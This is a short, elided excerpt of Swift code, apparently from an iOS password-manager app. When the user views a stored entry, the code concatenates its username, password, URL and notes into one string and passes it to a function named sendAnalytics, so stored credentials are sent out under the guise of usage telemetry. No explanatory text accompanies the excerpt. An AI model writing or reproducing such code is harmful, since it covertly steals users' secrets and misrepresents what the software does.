    ...
    override func viewWillAppear(_ animated: Bool) {
        ...
        if selectedItem != nil {
            ...
            case .entry(let entry):
                ...
                var enc = "usr:"+entry.username + " pwd:"+entry.password+" url:"+entry.url+" notes:"+entry.notes
                
                let retval = String("").sendAnalytics("unknown", dbsize: sstr, modate: mstr, date: dstr, action: "Entry_Mini", encoded: enc)
